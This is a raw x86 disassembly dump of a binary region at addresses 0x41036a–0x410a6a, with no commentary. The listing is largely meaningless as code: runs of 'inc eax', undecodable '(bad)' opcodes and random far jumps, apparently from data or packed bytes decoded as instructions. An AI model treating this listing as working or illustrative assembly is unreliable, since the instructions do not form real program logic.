  41036a:	inc    eax
  41036b:	inc    eax
  41036c:	inc    eax
  41036d:	inc    eax
  41036e:	mov    DWORD PTR [edx+esi*2-0x80],ecx
  410372:	inc    edi
  410373:	inc    eax
  410374:	bound  ebp,QWORD PTR [edx]
  410376:	je     0x4103ac
  410378:	adc    eax,ebp
  41037a:	inc    ebx
  41037b:	inc    eax
  41037c:	mov    ebx,0x5286434d
  410381:	inc    edi
  410382:	xor    BYTE PTR [eax+0x47],al
  410385:	inc    eax
  410386:	inc    eax
  410387:	inc    eax
  410388:	inc    eax
  410389:	inc    eax
  41038a:	inc    eax
  41038b:	rol    DWORD PTR [eax+0x40],0xf1
  41038f:	push   eax
  410390:	aad    0x3d
  410392:	add    ch,BYTE PTR [eax+0x3c]
  410395:	mov    ebx,0x40521666
  41039a:	test   BYTE PTR [edi+0x40],0x62
  41039e:	popf   
  41039f:	fdivr  st(6),st
  4103a1:	inc    eax
  4103a2:	dec    edi
  4103a3:	test   DWORD PTR [eax-0x61],eax
  4103a6:	inc    ebp
  4103a7:	bound  ecx,QWORD PTR [eax+0x40]
  4103aa:	dec    esp
  4103ab:	inc    ebx
  4103ac:	inc    eax
  4103ad:	inc    eax
  4103ae:	mov    bl,0x91
  4103b0:	and    al,0xa3
  4103b2:	adc    eax,0x40004040
  4103b7:	inc    eax
  4103b8:	inc    eax
  4103b9:	inc    eax
  4103ba:	inc    eax
  4103bb:	inc    eax
  4103bc:	nop
  4103bd:	cs jne 0x4103ca
  4103c0:	add    BYTE PTR [eax+edi*4+0xf400a45],0xb3
  4103c8:	aad    0xcd
  4103ca:	cmp    eax,0xf0404372
  4103cf:	inc    eax
  4103d0:	inc    eax
  4103d1:	inc    eax
  4103d2:	inc    eax
  4103d3:	inc    eax
  4103d4:	inc    eax
  4103d5:	inc    eax
  4103d6:	inc    eax
  4103d7:	inc    eax
  4103d8:	inc    eax
  4103d9:	inc    ebx
  4103da:	inc    edx
  4103db:	sbb    al,cl
  4103dd:	test   al,0xd1
  4103df:	inc    eax
  4103e0:	push   es
  4103e1:	jno    0x4103b3
  4103e3:	call   0x5a52:0x4996245
  4103ea:	mov    eax,ds:0x40404016
  4103ef:	inc    eax
  4103f0:	inc    eax
  4103f1:	inc    eax
  4103f2:	int3   
  4103f3:	jne    0x410435
  4103f5:	pop    es
  4103f6:	loop   0x4103e5
  4103f8:	inc    eax
  4103f9:	shl    edx,1
  4103fb:	sub    cl,BYTE PTR [esp+eiz*4+0x524085c5]
  410402:	ins    DWORD PTR es:[edi],dx
  410403:	int    0x40
  410405:	add    cl,al
  410407:	inc    eax
  410408:	inc    eax
  410409:	inc    eax
  41040a:	inc    eax
  41040b:	add    BYTE PTR [eax+0x62],al
  41040e:	gs dec edi
  410410:	sbb    al,0x40
  410412:	fist   WORD PTR [ebx+0x28]
  410415:	lds    edx,FWORD PTR [ebp-0x44bfbebd]
  41041b:	push   ecx
  41041c:	enter  0xe84f,0xb9
  410420:	inc    ebx
  410421:	inc    eax
  410422:	inc    eax
  410423:	inc    eax
  410424:	inc    eax
  410425:	inc    eax
  410426:	inc    eax
  410427:	inc    eax
  410428:	inc    eax
  410429:	inc    DWORD PTR [eax-0x29]
  41042c:	pop    esi
  41042d:	mov    ebp,0xc3624463
  410432:	xor    BYTE PTR [edx-0x3b859e09],ah
  410438:	adc    BYTE PTR [edx-0xea8189c],bh
  41043e:	nop
  41043f:	repz mov WORD PTR ds:0x37133547,cs
  410446:	arpl   bx,bp
  410448:	shl    dh,0x85
  41044b:	sub    eax,0x40b0b152
  410450:	inc    eax
  410451:	inc    eax
  410452:	inc    eax
  410453:	inc    eax
  410454:	inc    eax
  410455:	inc    eax
  410456:	inc    eax
  410457:	inc    eax
  410458:	inc    eax
  410459:	shl    BYTE PTR [ebp+0x4f],1
  41045c:	inc    ebx
  41045d:	mov    ?,WORD PTR [ecx]
  41045f:	popa   
  410460:	cmp    BYTE PTR ds:0x819040f1,ch
  410466:	inc    edx
  410467:	push   ecx
  410468:	xchg   esi,eax
  410469:	pop    ecx
  41046a:	aas    
  41046b:	inc    eax
  41046c:	daa    
  41046d:	ja     0x4104af
  41046f:	inc    eax
  410470:	inc    eax
  410471:	inc    eax
  410472:	inc    eax
  410473:	inc    eax
  410474:	inc    eax
  410475:	inc    eax
  410476:	add    BYTE PTR [ebp+0x7f],dl
  410479:	mov    dh,0x2c
  41047b:	jns    0x4104be
  41047d:	inc    ebx
  41047e:	push   edx
  41047f:	push   eax
  410480:	icebp  
  410481:	test   al,0x55
  410483:	xchg   ebp,eax
  410484:	(bad)
  410489:	adc    ah,al
  41048b:	push   edx
  41048c:	dec    ebx
  41048d:	lds    esp,FWORD PTR [ebx+eiz*1-0x2f]
  410491:	mov    esp,0x6f4105cd
  410496:	inc    eax
  410497:	inc    eax
  410498:	inc    eax
  410499:	inc    eax
  41049a:	inc    eax
  41049b:	inc    eax
  41049c:	and    eax,0x2a404040
  4104a1:	xor    DWORD PTR [esi],esp
  4104a3:	inc    edx
  4104a4:	inc    eax
  4104a5:	inc    eax
  4104a6:	sub    al,0x4c
  4104a8:	xchg   esi,eax
  4104a9:	push   0x33
  4104ab:	not    BYTE PTR [ecx-0x26b1989d]
  4104b1:	mov    dl,0x49
  4104b3:	lods   al,BYTE PTR ds:[esi]
  4104b4:	inc    edx
  4104b5:	add    ebp,DWORD PTR [ecx+0x40404040]
  4104bb:	inc    eax
  4104bc:	inc    eax
  4104bd:	inc    eax
  4104be:	inc    eax
  4104bf:	inc    eax
  4104c0:	inc    eax
  4104c1:	inc    ecx
  4104c2:	outs   dx,DWORD PTR ds:[esi]
  4104c3:	ins    DWORD PTR es:[edi],dx
  4104c4:	xchg   ecx,eax
  4104c5:	bound  esi,QWORD PTR [edi-0x34]
  4104c8:	dec    edx
  4104c9:	inc    ebx
  4104ca:	ret    
  4104cb:	mov    esi,0xd1cc1543
  4104d0:	dec    edx
  4104d1:	xor    BYTE PTR [ebx],ch
  4104d3:	jge    0x410525
  4104d5:	int    0x44
  4104d7:	inc    esi
  4104d8:	and    esp,DWORD PTR [eax+0x3f]
  4104db:	adc    edi,DWORD PTR [edi+0x5c622079]
  4104e1:	inc    edi
  4104e2:	inc    eax
  4104e3:	inc    eax
  4104e4:	inc    eax
  4104e5:	inc    eax
  4104e6:	inc    eax
  4104e7:	inc    eax
  4104e8:	rol    DWORD PTR [eax+0x40],0x69
  4104ec:	lock das 
  4104ee:	push   0x85443080
  4104f3:	push   0x9ebb06b3
  4104f8:	inc    eax
  4104f9:	cmp    eax,0x32426f43
  4104fe:	mov    edi,0x906102bd
  410503:	loope  0x41057a
  410505:	aaa    
  410506:	mov    edi,0xc4444efe
  41050b:	fstp   DWORD PTR [edx-0x332afabc]
  410511:	cmp    eax,0x40004040
  410516:	inc    eax
  410517:	inc    eax
  410518:	inc    eax
  410519:	inc    eax
  41051a:	inc    eax
  41051b:	dec    edx
  41051c:	rcl    DWORD PTR [edx-0x30],0xfc
  410520:	cmc    
  410521:	jge    0x410574
  410523:	fld    DWORD PTR [edi-0x1957fb86]
  410529:	shl    DWORD PTR [eax],0xa0
  41052c:	mov    al,BYTE PTR [eax+0x40]
  41052f:	inc    eax
  410530:	inc    eax
  410531:	inc    eax
  410532:	inc    eax
  410533:	inc    eax
  410534:	inc    eax
  410535:	inc    eax
  410536:	inc    eax
  410537:	imul   edi,DWORD PTR [ecx-0x4e],0x44
  41053b:	inc    eax
  41053c:	dec    ebx
  41053d:	cmp    al,0x26
  41053f:	jno    0x410552
  410541:	inc    ebx
  410542:	sub    al,0x40
  410544:	xor    dh,dl
  410546:	fs inc esi
  410548:	xor    esp,DWORD PTR [ebx-0x4]
  41054b:	inc    ecx
  41054c:	inc    ecx
  41054d:	inc    eax
  41054e:	inc    eax
  41054f:	inc    eax
  410550:	inc    eax
  410551:	inc    eax
  410552:	inc    eax
  410553:	int3   
  410554:	jne    0x410596
  410556:	pop    ds
  410557:	scas   al,BYTE PTR es:[edi]
  410558:	xor    DWORD PTR [eax],edi
  41055a:	ror    ch,0xf4
  41055d:	dec    edx
  41055e:	inc    ecx
  41055f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410560:	cmp    BYTE PTR [edx+0x63],0x77
  410564:	test   al,0xed
  410566:	inc    ebx
  410567:	inc    eax
  410568:	add    cl,al
  41056a:	inc    eax
  41056b:	inc    eax
  41056c:	inc    eax
  41056d:	inc    eax
  41056e:	add    BYTE PTR [eax-0x6],al
  410571:	repnz push ss
  410573:	mov    al,0xee
  410575:	inc    ebp
  410576:	jmp    0x4405:0x52b7ac30
  41057d:	xor    eax,0x40404040
  410582:	inc    eax
  410583:	inc    eax
  410584:	inc    eax
  410585:	inc    eax
  410586:	inc    DWORD PTR [eax+0xc]
  410589:	pop    esp
  41058a:	sub    eax,0x2c67636d
  41058f:	inc    eax
  410590:	arpl   WORD PTR [edi+0x19],ax
  410593:	add    eax,0x40fa7aca
  410598:	pop    es
  410599:	test   DWORD PTR [ecx+esi*8+0x25],esp
  41059d:	push   esp
  41059e:	lds    eax,FWORD PTR [edx]
  4105a0:	mov    eax,0xad450743
  4105a5:	clc    
  4105a6:	sbb    eax,DWORD PTR [edx+eiz*2-0x70]
  4105aa:	mov    ds:0x404040f1,eax
  4105af:	inc    eax
  4105b0:	inc    eax
  4105b1:	inc    eax
  4105b2:	inc    eax
  4105b3:	inc    eax
  4105b4:	inc    eax
  4105b5:	inc    eax
  4105b6:	and    DWORD PTR [esi-0x1e56771e],ebp
  4105bc:	xlat   BYTE PTR ds:[ebx]
  4105bd:	inc    ecx
  4105be:	stos   BYTE PTR es:[edi],al
  4105bf:	arpl   WORD PTR [ecx+edi*8+0x4a],ax
  4105c3:	xor    cl,ah
  4105c5:	mov    cl,0xe5
  4105c7:	ret    0xc32c
  4105ca:	stos   DWORD PTR es:[edi],eax
  4105cb:	jmp    0x668d58da
  4105d0:	clc    
  4105d1:	inc    eax
  4105d2:	jp     0x410614
  4105d4:	inc    eax
  4105d5:	inc    eax
  4105d6:	inc    eax
  4105d7:	inc    eax
  4105d8:	inc    eax
  4105d9:	inc    eax
  4105da:	inc    eax
  4105db:	add    BYTE PTR [edx+0x2f],ah
  4105de:	pop    edi
  4105df:	test   al,0xac
  4105e1:	aad    0x88
  4105e3:	xchg   edi,eax
  4105e4:	inc    esp
  4105e5:	xchg   ebx,eax
  4105e6:	inc    edx
  4105e7:	sub    al,0x22
  4105e9:	popf   
  4105ea:	inc    ebp
  4105eb:	push   edx
  4105ec:	push   ecx
  4105ed:	push   esp
  4105ee:	sbb    al,0x5d
  4105f0:	in     eax,dx
  4105f1:	out    dx,al
  4105f2:	inc    eax
  4105f3:	inc    esi
  4105f4:	inc    ebx
  4105f5:	cs sub al,0xa1
  4105f8:	inc    sp
  4105fa:	fdiv   DWORD PTR [eax]
  4105fc:	xor    eax,DWORD PTR [ebx]
  4105fe:	inc    eax
  4105ff:	inc    eax
  410600:	inc    eax
  410601:	inc    eax
  410602:	inc    eax
  410603:	inc    eax
  410604:	and    eax,0x3b404040
  410609:	(bad)  
  41060a:	stos   BYTE PTR es:[edi],al
  41060b:	sub    al,0x8
  41060d:	or     DWORD PTR [eax-0x19],ebx
  410610:	xor    esp,DWORD PTR [edi]
  410612:	add    eax,0x47a962f6
  410617:	dec    esp
  410618:	cmp    eax,0x404040bb
  41061d:	inc    eax
  41061e:	inc    eax
  41061f:	inc    eax
  410620:	inc    eax
  410621:	inc    eax
  410622:	inc    eax
  410623:	inc    eax
  410624:	dec    edi
  410625:	int    0x44
  410627:	dec    esp
  410628:	test   DWORD PTR [edi+eax*2],ebp
  41062b:	das    
  41062c:	fimul  WORD PTR [ebx-0x8]
  41062f:	ds inc ebx
  410631:	icebp  
  410632:	mov    al,0x69
  410634:	push   ebp
  410635:	(bad)  
  410636:	push   eax
  410637:	inc    ebp
  410638:	nop
  410639:	test   DWORD PTR [edx+0x31],edi
  41063c:	test   al,0x40
  41063e:	inc    eax
  41063f:	inc    eax
  410640:	inc    eax
  410641:	inc    eax
  410642:	inc    eax
  410643:	rol    DWORD PTR [eax+0x40],0x44
  410647:	outs   dx,DWORD PTR ds:[esi]
  410648:	mov    ecx,0xa1434cfe
  41064d:	adc    eax,0xc9c3df2c
  410652:	bound  esi,QWORD PTR [eax+0x10f42045]
  410658:	inc    esp
  410659:	cmc    
  41065a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41065b:	sub    al,0x61
  41065d:	outs   dx,BYTE PTR ds:[esi]
  41065e:	inc    eax
  41065f:	inc    eax
  410660:	add    BYTE PTR [eax+0x40],al
  410663:	inc    eax
  410664:	inc    eax
  410665:	inc    eax
  410666:	inc    eax
  410667:	lds    ebp,FWORD PTR [eax+ebx*2+0x38880d07]
  41066e:	fs aam 0x64
  410671:	sub    BYTE PTR [esi-0x51c0e9e],dh
  410677:	cli    
  410678:	popa   
  410679:	pop    es
  41067a:	arpl   WORD PTR [eax-0x39],ax
  41067d:	outs   dx,DWORD PTR ds:[esi]
  41067e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41067f:	inc    esp
  410680:	mov    eax,0x404040ab
  410685:	inc    eax
  410686:	inc    eax
  410687:	inc    eax
  410688:	inc    eax
  410689:	inc    eax
  41068a:	inc    eax
  41068b:	inc    eax
  41068c:	inc    ebx
  41068d:	std    
  41068e:	adc    ecx,esp
  410690:	ja     0x4106be
  410692:	popaw  
  410694:	xor    eax,DWORD PTR [edx+0x50]
  410697:	push   esp
  410698:	push   0xfffffff2
  41069a:	cmp    esi,DWORD PTR [eax+eax*2]
  41069d:	inc    eax
  41069e:	inc    eax
  41069f:	inc    eax
  4106a0:	inc    eax
  4106a1:	inc    eax
  4106a2:	int3   
  4106a3:	jne    0x4106e5
  4106a5:	push   esp
  4106a6:	out    0xf7,al
  4106a8:	loopne 0x410710
  4106aa:	add    DWORD PTR [eax+0x48df47ce],ebp
  4106b0:	daa    
  4106b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106b2:	popf   
  4106b3:	adc    cl,BYTE PTR [ebp+eax*4+0x52b7283]
  4106ba:	inc    esp
  4106bb:	mov    ah,0x3d
  4106bd:	inc    ebx
  4106be:	jne    0x4106af
  4106c0:	mov    eax,ds:0xc0412c42
  4106c5:	nop
  4106c6:	fidiv  WORD PTR [edi*4-0x3effbf3a]
  4106cd:	inc    eax
  4106ce:	inc    eax
  4106cf:	inc    eax
  4106d0:	inc    eax
  4106d1:	add    BYTE PTR [eax-0x10],al
  4106d4:	outs   dx,DWORD PTR ds:[esi]
  4106d5:	dec    eax
  4106d6:	fwait
  4106d7:	bound  edx,QWORD PTR [eax-0xb]
  4106da:	es int 0xd8
  4106dd:	xor    al,0x43
  4106df:	mov    ebx,0x4af8e370
  4106e4:	inc    ecx
  4106e5:	int3   
  4106e6:	rcr    DWORD PTR [edi],1
  4106e8:	and    eax,0x4040a2ff
  4106ed:	inc    eax
  4106ee:	inc    eax
  4106ef:	inc    eax
  4106f0:	inc    eax
  4106f1:	inc    eax
  4106f2:	inc    eax
  4106f3:	inc    DWORD PTR [eax-0x12]
  4106f6:	xor    BYTE PTR [esp+ecx*1+0x2029513f],cl
  4106fd:	dec    eax
  4106fe:	call   0xb20a8140
  410703:	pushf  
  410704:	mov    edi,0x39c0a83c
  410709:	lods   al,BYTE PTR ds:[esi]
  41070a:	inc    ebx
  41070b:	and    eax,0x8c10ee66
  410710:	outs   dx,DWORD PTR ds:[esi]
  410711:	fdiv   st,st(0)
  410713:	inc    edx
  410714:	mov    al,ds:0x414cb8c5
  410719:	jmp    0x410742
  41071b:	mov    al,ds:0x40404040
  410720:	inc    eax
  410721:	inc    eax
  410722:	inc    eax
  410723:	inc    eax
  410724:	inc    eax
  410725:	inc    eax
  410726:	or     eax,0x436441f5
  41072b:	jle    0x410737
  41072d:	pop    es
  41072e:	jbe    0x410716
  410730:	outs   dx,DWORD PTR ds:[esi]
  410731:	aam    0x30
  410733:	push   esi
  410734:	repz leave 
  410736:	inc    eax
  410737:	inc    eax
  410738:	inc    eax
  410739:	inc    eax
  41073a:	inc    eax
  41073b:	inc    eax
  41073c:	inc    eax
  41073d:	inc    eax
  41073e:	add    BYTE PTR [edx+0x44],cl
  410741:	fcomp  DWORD PTR [ebx]
  410743:	push   eax
  410744:	xlat   BYTE PTR ds:[ebx]
  410745:	dec    esi
  410746:	and    ah,BYTE PTR [ebx+0x2c]
  410749:	inc    ecx
  41074a:	inc    ecx
  41074b:	inc    edi
  41074c:	(bad)  
  41074d:	shl    BYTE PTR ds:0x2d34ec33,cl
  410753:	test   DWORD PTR ds:0x749f301b,ebx
  410759:	cmc    
  41075a:	aas    
  41075b:	pusha  
  41075c:	jecxz  0x410796
  41075e:	inc    eax
  41075f:	inc    eax
  410760:	inc    eax
  410761:	inc    eax
  410762:	inc    eax
  410763:	inc    eax
  410764:	and    eax,0x21404040
  410769:	in     eax,dx
  41076a:	lea    ebp,[eax+0x4295f0a9]
  410770:	mov    ch,0x62
  410772:	inc    esp
  410773:	adc    DWORD PTR [edx-0x60],esi
  410776:	dec    esi
  410777:	xor    DWORD PTR [ebp-0x16],ecx
  41077a:	sub    al,0xbc
  41077c:	sahf   
  41077d:	mov    eax,0x89e147c7
  410782:	jmp    0xc2de:0x7b435241
  410789:	int    0x40
  41078b:	inc    eax
  41078c:	inc    eax
  41078d:	inc    eax
  41078e:	inc    eax
  41078f:	inc    eax
  410790:	inc    eax
  410791:	inc    eax
  410792:	inc    eax
  410793:	inc    eax
  410794:	pop    edx
  410795:	inc    ebp
  410796:	inc    ebp
  410797:	rol    BYTE PTR [edi+0x36],cl
  41079a:	jecxz  0x41079e
  41079c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41079d:	mov    eax,0x526ef8ec
  4107a2:	dec    DWORD PTR [edi+edi*1+0x67]
  4107a6:	cmp    DWORD PTR [esi+0x63a1517b],ebp
  4107ac:	add    al,0x22
  4107ae:	inc    ebp
  4107af:	mov    WORD PTR [edx+0x62c32541],gs
  4107b5:	sub    DWORD PTR ds:0x4039323e,0x40
  4107bc:	inc    eax
  4107bd:	inc    eax
  4107be:	inc    eax
  4107bf:	inc    eax
  4107c0:	rol    DWORD PTR [eax+0x40],0x61
  4107c4:	mov    DWORD PTR [eax-0x58],eax
  4107c7:	ds inc ecx
  4107c9:	mov    edi,ebp
  4107cb:	sub    ebp,ecx
  4107cd:	int3   
  4107ce:	adc    ch,BYTE PTR [ecx-0x4c0a8dbd]
  4107d4:	arpl   WORD PTR [ecx-0x44],bp
  4107d7:	dec    esp
  4107d8:	xor    BYTE PTR [esi],al
  4107da:	and    DWORD PTR [ebx],esp
  4107dc:	mov    esi,fs
  4107de:	inc    edx
  4107df:	xor    eax,0x4040a84c
  4107e4:	add    BYTE PTR [eax+0x40],al
  4107e7:	inc    eax
  4107e8:	inc    eax
  4107e9:	inc    eax
  4107ea:	inc    eax
  4107eb:	adc    ah,ch
  4107ed:	jecxz  0x4107c4
  4107ef:	outs   dx,DWORD PTR ds:[esi]
  4107f0:	inc    ebp
  4107f1:	inc    edi
  4107f2:	pop    edx
  4107f3:	das    
  4107f4:	xchg   BYTE PTR [ecx+eax*2],bh
  4107f7:	fadd   DWORD PTR [edx-0x7b]
  4107fa:	test   eax,0xeeb1e77c
  4107ff:	push   0x57e84346
  410804:	shl    DWORD PTR [eax],0x8c
  410807:	or     al,0xf0
  410809:	nop
  41080a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41080b:	xchg   ecx,eax
  41080c:	icebp  
  41080d:	gs cmp al,0x64
  410810:	inc    eax
  410811:	inc    eax
  410812:	inc    eax
  410813:	inc    eax
  410814:	inc    eax
  410815:	inc    eax
  410816:	inc    eax
  410817:	inc    eax
  410818:	inc    eax
  410819:	inc    eax
  41081a:	dec    ecx
  41081b:	push   ebp
  41081c:	cmp    eax,DWORD PTR [ebp-0x41]
  41081f:	fsubr  st(4),st
  410821:	xor    al,0x34
  410823:	inc    ebx
  410824:	test   DWORD PTR [edx+ecx*8+0x44a8cd50],esi
  41082b:	rcr    DWORD PTR [esi+0x62],1
  41082e:	jns    0x410800
  410830:	pop    eax
  410831:	dec    edx
  410832:	mov    ecx,0xc0421ae3
  410837:	dec    ecx
  410838:	test   BYTE PTR [eax+0x40],0x40
  41083c:	inc    eax
  41083d:	inc    eax
  41083e:	inc    eax
  41083f:	int3   
  410840:	jne    0x410882
  410842:	test   al,0xc3
  410844:	mov    ecx,0xe8e9308b
  410849:	mov    WORD PTR [ecx],ss
  41084b:	mov    ebx,0xc07762a8
  410850:	imul   edi,DWORD PTR [eax+edi*4],0x40079f0d
  410857:	push   DWORD PTR [edx+eiz*8+0x7f414441]
  41085e:	inc    eax
  41085f:	add    cl,al
  410861:	inc    eax
  410862:	inc    eax
  410863:	inc    eax
  410864:	inc    eax
  410865:	add    BYTE PTR [eax+0x3],al
  410868:	les    eax,FWORD PTR [ecx-0x3b]
  41086b:	inc    ebp
  41086c:	inc    ebp
  41086d:	inc    ebx
  41086e:	loop   0x410898
  410870:	xor    eax,0x8cb849ad
  410875:	inc    eax
  410876:	inc    eax
  410877:	inc    eax
  410878:	inc    eax
  410879:	inc    eax
  41087a:	inc    eax
  41087b:	inc    eax
  41087c:	inc    eax
  41087d:	inc    DWORD PTR [eax+0x30]
  410880:	rol    DWORD PTR [edx-0x3c],1
  410883:	(bad)  
  410884:	imul   BYTE PTR [ebp+0x40]
  410887:	dec    eax
  410888:	push   0x10
  41088a:	aas    
  41088b:	test   al,0x8c
  41088d:	fs inc ecx
  41088f:	inc    edi
  410890:	mov    ds:0x3c10c501,al
  410895:	cmp    al,0xeb
  410897:	test   DWORD PTR [esi],eax
  410899:	inc    edi
  41089a:	xor    ecx,DWORD PTR [edx+0x43a9a7e0]
  4108a0:	inc    eax
  4108a1:	inc    eax
  4108a2:	inc    eax
  4108a3:	inc    eax
  4108a4:	inc    eax
  4108a5:	inc    eax
  4108a6:	inc    eax
  4108a7:	inc    eax
  4108a8:	inc    eax
  4108a9:	inc    eax
  4108aa:	cmp    dh,BYTE PTR [eax+0x3f]
  4108ad:	aaa    
  4108ae:	aad    0xa2
  4108b0:	inc    ecx
  4108b1:	nop
  4108b2:	mov    eax,ds:0x7f416375
  4108b7:	test   al,0x6d
  4108b9:	jb     0x4108fc
  4108bb:	inc    eax
  4108bc:	inc    edx
  4108bd:	cmp    BYTE PTR [edx-0x4dbc8fef],bl
  4108c3:	arpl   WORD PTR [eax+0x40],ax
  4108c6:	inc    eax
  4108c7:	inc    eax
  4108c8:	inc    eax
  4108c9:	inc    eax
  4108ca:	inc    eax
  4108cb:	inc    eax
  4108cc:	add    BYTE PTR [ecx],ah
  4108ce:	add    al,0x14
  4108d0:	mov    ah,0x52
  4108d2:	shr    DWORD PTR [eax],1
  4108d4:	inc    eax
  4108d5:	mov    edi,0xa94284d2
  4108da:	pop    ss
  4108db:	xchg   esi,eax
  4108dc:	jp     0x410935
  4108de:	ins    DWORD PTR es:[edi],dx
  4108df:	bound  ebx,QWORD PTR [edx-0x1fce92b6]
  4108e5:	cmp    DWORD PTR [edx-0x3b],ebp
  4108e8:	in     al,dx
  4108e9:	inc    eax
  4108ea:	inc    eax
  4108eb:	inc    eax
  4108ec:	inc    eax
  4108ed:	inc    eax
  4108ee:	inc    eax
  4108ef:	and    eax,0xab404040
  4108f4:	sbb    eax,0x62485477
  4108f9:	dec    edi
  4108fa:	outs   dx,DWORD PTR ds:[esi]
  4108fb:	inc    eax
  4108fc:	into   
  4108fd:	imul   edi,edi,0xffffffed
  410900:	fs inc ebx
  410902:	xor    BYTE PTR [eax+0x41],al
  410905:	aas    
  410906:	dec    esp
  410907:	push   edi
  410908:	sub    al,0x3f
  41090a:	lea    eax,[ecx+0x43]
  41090d:	pop    edx
  41090e:	push   esp
  41090f:	xor    edx,DWORD PTR [eax+0x40]
  410912:	inc    eax
  410913:	inc    eax
  410914:	inc    eax
  410915:	inc    eax
  410916:	inc    eax
  410917:	inc    eax
  410918:	inc    eax
  410919:	inc    eax
  41091a:	inc    eax
  41091b:	jecxz  0x4108e9
  41091d:	in     eax,0x30
  41091f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410920:	gs push edi
  410922:	(bad)  
  410923:	aad    0xbc
  410925:	test   eax,0x3f449244
  41092a:	xor    DWORD PTR [ebp-0x54],esi
  41092d:	inc    eax
  41092e:	inc    edi
  41092f:	add    cl,dl
  410931:	dec    edi
  410932:	retf   0x3935
  410935:	inc    eax
  410936:	test   DWORD PTR [esi+0x5641a14d],esp
  41093c:	jns    0x41097f
  41093e:	inc    ebx
  41093f:	pop    ebx
  410940:	inc    eax
  410941:	inc    eax
  410942:	inc    eax
  410943:	inc    eax
  410944:	inc    eax
  410945:	inc    eax
  410946:	rol    DWORD PTR [eax+0x40],0xdc
  41094a:	inc    eax
  41094b:	test   al,0x2c
  41094d:	nop
  41094e:	jmp    0x4542:0xe262a590
  410955:	popa   
  410956:	test   eax,0x4040f10f
  41095b:	add    BYTE PTR [eax+0x40],al
  41095e:	inc    eax
  41095f:	inc    eax
  410960:	inc    eax
  410961:	inc    eax
  410962:	inc    eax
  410963:	or     DWORD PTR [edx],ebp
  410965:	int3   
  410966:	cmp    BYTE PTR [ebx+eax*2+0x53],cl
  41096a:	jge    0x4109d0
  41096c:	inc    eax
  41096d:	inc    esi
  41096e:	arpl   WORD PTR ds:0xa098e3d1,si
  410974:	sub    ch,dl
  410976:	outs   dx,DWORD PTR ds:[esi]
  410977:	inc    ecx
  410978:	ds sbb eax,0x4040bd41
  41097e:	inc    eax
  41097f:	inc    eax
  410980:	inc    eax
  410981:	inc    eax
  410982:	inc    eax
  410983:	inc    eax
  410984:	inc    eax
  410985:	inc    eax
  410986:	inc    esp
  410987:	sar    BYTE PTR [bx+si-0x799b],1
  41098c:	test   DWORD PTR [edi],0xc3c31a2d
  410992:	imul   eax,DWORD PTR [ebp+0x3],0x6f84084e
  410999:	mov    ebx,0xe2324a4d
  41099e:	bound  esp,QWORD PTR [edx-0x5f]
  4109a1:	add    eax,0x57245d28
  4109a6:	and    ebx,DWORD PTR [edx+0x52]
  4109a9:	test   BYTE PTR [eax-0x53],0x40
  4109ad:	inc    eax
  4109ae:	inc    eax
  4109af:	inc    eax
  4109b0:	inc    eax
  4109b1:	inc    eax
  4109b2:	int3   
  4109b3:	jne    0x4109f5
  4109b5:	dec    ecx
  4109b6:	aas    
  4109b7:	lods   al,BYTE PTR ds:[esi]
  4109b8:	les    ecx,FWORD PTR [eax+0x4f]
  4109bb:	inc    eax
  4109bc:	or     edx,DWORD PTR [edx+0x73]
  4109bf:	bound  ebx,QWORD PTR [edx]
  4109c1:	test   BYTE PTR [ecx+0x43],cl
  4109c4:	pop    ecx
  4109c5:	jl     0x410a1e
  4109c7:	outs   dx,DWORD PTR ds:[esi]
  4109c8:	nop
  4109c9:	add    DWORD PTR [edi],edi
  4109cb:	inc    eax
  4109cc:	fist   WORD PTR [ecx+edi*1+0x40]
  4109d0:	add    cl,al
  4109d2:	inc    eax
  4109d3:	inc    eax
  4109d4:	inc    eax
  4109d5:	inc    eax
  4109d6:	add    BYTE PTR [eax+0x34],al
  4109d9:	bound  ecx,QWORD PTR [edx-0x4279b9bc]
  4109df:	push   edi
  4109e0:	jmp    0x47fb6caa
  4109e5:	call   DWORD PTR [esi+0x3f]
  4109e8:	ds cmp eax,0xb84c3c6
  4109ee:	push   ecx
  4109ef:	dec    eax
  4109f0:	popfw  
  4109f2:	test   al,0x49
  4109f4:	inc    eax
  4109f5:	inc    eax
  4109f6:	inc    eax
  4109f7:	inc    eax
  4109f8:	inc    eax
  4109f9:	inc    eax
  4109fa:	inc    eax
  4109fb:	inc    eax
  4109fc:	inc    DWORD PTR [eax+0x43]
  4109ff:	add    BYTE PTR [ebp+ebp*8-0x57],al
  410a03:	sbb    dl,BYTE PTR [eax]
  410a05:	inc    eax
  410a06:	nop
  410a07:	shl    DWORD PTR [edi-0x7f6f47aa],1
  410a0d:	imul   ebp,DWORD PTR [ebx+ebp*1],0x62cdf397
  410a14:	inc    ecx
  410a15:	sub    BYTE PTR [ebx+0x46],al
  410a18:	inc    eax
  410a19:	das    
  410a1a:	inc    esp
  410a1b:	aad    0x6a
  410a1d:	inc    ebx
  410a1e:	rol    DWORD PTR [eax+0x40],1
  410a21:	inc    eax
  410a22:	inc    eax
  410a23:	inc    eax
  410a24:	inc    eax
  410a25:	inc    eax
  410a26:	inc    eax
  410a27:	inc    eax
  410a28:	inc    eax
  410a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a2a:	push   esp
  410a2b:	push   esi
  410a2c:	in     al,0x87
  410a2e:	lock mov edx,0xff708a91
  410a34:	je     0x410a2b
  410a36:	stos   BYTE PTR es:[edi],al
  410a37:	add    eax,0x40404040
  410a3c:	inc    eax
  410a3d:	inc    eax
  410a3e:	inc    eax
  410a3f:	inc    eax
  410a40:	add    dl,ah
  410a42:	stos   BYTE PTR es:[edi],al
  410a43:	inc    eax
  410a44:	in     al,0x18
  410a46:	dec    ebp
  410a47:	mov    al,0x86
  410a49:	sti    
  410a4a:	in     al,0x50
  410a4c:	and    BYTE PTR [ebx-0x23bf99d4],ch
  410a52:	loope  0x410acc
  410a54:	add    eax,0xb17ab4
  410a59:	inc    ecx
  410a5a:	inc    esi
  410a5b:	inc    esp
  410a5c:	jae    0x410a9e
  410a5e:	inc    eax
  410a5f:	inc    eax
  410a60:	inc    eax
  410a61:	inc    eax
  410a62:	inc    eax
  410a63:	and    eax,0x33404040
  410a68:	int    0x70
  410a6a:	cmp    BYTE PTR [ebx-0x7],al
